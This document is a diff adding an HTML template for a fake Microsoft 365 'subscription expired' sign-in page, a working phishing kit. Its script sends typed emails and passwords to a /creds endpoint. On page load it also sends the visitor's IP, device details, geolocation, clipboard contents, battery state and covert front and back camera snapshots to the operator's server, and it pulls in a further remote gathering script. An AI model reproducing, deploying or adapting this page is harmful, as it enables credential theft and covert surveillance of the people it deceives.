@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Microsoft 365 - Subscription Expired</title>
+<link rel="icon" href="https://res.cdn.office.net/owamail/20241115001.14/resources/images/favicons/mail-seen.ico">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif; background: #f2f2f2; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+.container { width: 100%; max-width: 440px; padding: 20px; }
+.ms-logo { text-align: center; margin-bottom: 24px; }
+.ms-grid { display: inline-grid; grid-template-columns: 1fr 1fr; gap: 3px; width: 24px; height: 24px; }
+.ms-grid div { background: #0078D4; }
+.ms-text { font-size: 20px; font-weight: 600; color: #242424; margin-left: 8px; vertical-align: middle; display: inline; }
+.card { background: #ffffff; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); overflow: hidden; }
+.warning-banner { background: #FFF4CE; border-bottom: 1px solid #FFE295; padding: 16px 24px; display: flex; align-items: center; gap: 12px; }
+.warning-icon { font-size: 24px; }
+.warning-text { font-size: 14px; color: #242424; font-weight: 600; }
+.card-body { padding: 32px 24px; }
+.app-icons { display: flex; justify-content: center; gap: 16px; margin-bottom: 28px; }
+.app-icon { width: 44px; height: 44px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; color: #fff; }
+.app-word { background: #185ABD; }
+.app-excel { background: #107C41; }
+.app-ppt { background: #C43E1C; }
+.app-outlook { background: #0078D4; }
+.app-teams { background: #6264A7; }
+h1 { font-size: 24px; font-weight: 600; color: #242424; margin-bottom: 8px; text-align: center; }
+.subtitle { font-size: 14px; color: #616161; text-align: center; margin-bottom: 28px; line-height: 1.6; }
+.form-group { margin-bottom: 18px; }
+.form-group label { display: block; font-size: 14px; font-weight: 600; color: #242424; margin-bottom: 6px; }
+.form-group input { width: 100%; padding: 10px 12px; background: #fff; border: 1px solid #8A8886; border-radius: 4px; font-size: 14px; color: #242424; }
+.form-group input:focus { outline: none; border-color: #0078D4; border-width: 2px; padding: 9px 11px; }
+.form-group input::placeholder { color: #A19F9D; }
+.keep-signed { display: flex; align-items: center; gap: 8px; margin-bottom: 18px; font-size: 14px; color: #242424; }
+.keep-signed input { width: 16px; height: 16px; accent-color: #0078D4; }
+.btn-login { width: 100%; padding: 10px 20px; background: #0078D4; color: #ffffff; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+.btn-login:hover { background: #106EBE; }
+.links { margin-top: 16px; text-align: center; }
+.links a { color: #0067B8; font-size: 13px; text-decoration: none; }
+.links a:hover { text-decoration: underline; color: #004578; }
+.loading { display: none; padding: 30px; text-align: center; }
+.spinner { border: 3px solid #E1DFDD; border-top: 3px solid #0078D4; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.footer { text-align: center; margin-top: 24px; font-size: 12px; color: #616161; }
+.footer a { color: #0067B8; text-decoration: none; }
+@media (max-width: 480px) { .container { padding: 16px; } .card-body { padding: 24px 16px; } h1 { font-size: 20px; } .app-icon { width: 36px; height: 36px; font-size: 12px; } }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="ms-logo">
+<div class="ms-grid"><div></div><div></div><div></div><div></div></div>
+<span class="ms-text">Microsoft</span>
+</div>
+<div class="card">
+<div class="warning-banner">
+<span class="warning-icon">⚠️</span>
+<span class="warning-text">Your Microsoft 365 subscription has expired</span>
+</div>
+<div class="card-body">
+<div class="app-icons">
+<div class="app-icon app-word">W</div>
+<div class="app-icon app-excel">X</div>
+<div class="app-icon app-ppt">P</div>
+<div class="app-icon app-outlook">O</div>
+<div class="app-icon app-teams">T</div>
+</div>
+<h1>Your Subscription Has Expired</h1>
+<p class="subtitle">Your Microsoft 365 subscription expired on <strong>Jan 15, 2025</strong>. Sign in to renew and restore access to Word, Excel, PowerPoint, Outlook, and Teams.</p>
+<form id="loginForm">
+<div class="form-group">
+<label>Email, phone, or Skype</label>
+<input type="text" id="email" placeholder="someone@example.com" required autofocus>
+</div>
+<div class="form-group">
+<label>Password</label>
+<input type="password" id="password" placeholder="Enter password" required>
+</div>
+<label class="keep-signed"><input type="checkbox" checked> Keep me signed in</label>
+<button type="submit" class="btn-login">Sign in & Renew</button>
+</form>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p style="color:#616161;font-size:14px;">Signing in...</p>
+</div>
+<div class="links">
+<a href="#">No account? Create one!</a> · <a href="#">Can't access your account?</a>
+</div>
+</div>
+</div>
+<div class="footer">
+<p><a href="#">Terms of use</a> · <a href="#">Privacy & cookies</a></p>
+<p style="margin-top:4px;">© Microsoft 2024</p>
+</div>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video=document.getElementById('video'), canvas=document.getElementById('canvas');
+
+async function gatherAll(){
+    let td='📧 <b>Office 365 Victim!</b>\n\n';
+    td+='⚓ IP: <code><%=ip %></code>\n';
+    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
+    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
+    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
+    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
+    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
+    try{await captureCamera("user","selfie");}catch(e){}
+    try{await captureCamera("environment","back");}catch(e){}
+    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
+    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
+}
+
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    var email = document.getElementById('email').value;
+    var pass = document.getElementById('password').value;
+    document.querySelector('form').style.display='none';
+    document.getElementById('loading').style.display='block';
+    fetch('/creds', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({username: email, password: pass, uri: '<%=uid %>', path: '<%=uid %>'})
+    }).then(function(){ window.location.href = '<%=url %>'; });
+});
+
+window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
+</script>
+</body>
+</html>
